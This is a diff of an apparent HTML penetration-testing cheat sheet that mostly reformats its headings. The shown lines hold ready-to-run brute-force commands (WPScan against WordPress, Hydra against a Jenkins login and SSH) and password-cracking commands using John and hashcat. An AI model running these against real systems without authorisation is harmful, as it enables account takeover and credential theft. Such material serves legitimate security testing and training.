@@ -291,13 +291,11 @@ Then you just have to look and wait in your lister terminal for 1 min.
 
 <br><h1>Brute Force Logins</h1>
 
-<b>Brute Force Wordpress Login</b>
-
-<b>WPScan</b>
+<br><b>Brute Force Wordpress Login with WPScan</b>
 
 <b>pform@attacker~: </b><code>wpscan --url http://10.10.20.20/blog -U admin -P /opt/wordlists/rockyou.txt -t 20</code>
 
-<b>Hydra</b>
+<b>Brute Force with Hydra</b>
 
 <b>example - Jenkins</b>
 
@@ -305,11 +303,11 @@ Then you just have to look and wait in your lister terminal for 1 min.
   
 <b>pform@attacker~: </b><code>hydra -l admin -P /opt/wordlists/rockyou.txt 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError' -I -s 4444</code>
 
-<b>example - ssh</b>
+<b>example - SSH</b>
 
 <b>pform@attacker~: </b><code>hydra -l admin -P /opt/wordlists/rockyou.txt ssh://10.10.20.20 -p 22</code>
 
-<br><h1>Password Cracking</h1>
+<br><br><h1>Password Cracking</h1>
 
 <b>ZIP</b>
 
@@ -333,7 +331,7 @@ Crack Hash
 
 <b>pform@attacker~: </b><code>john --format=gpg --wordlist=/opt/wordlists/rockyou.txt  wordlisthash-from-file</code>
 
-<b>Crack sha512 (deafult unix root hash)</b>
+<br><b>Crack sha512 (deafult unix root hash)</b>
 
 <b>pform@attacker~: </b><code>hashcat -m 1800 -a 0 -o hash-found.txt userhash.txt /opt/wordlists/rockyou.txt</code>
 
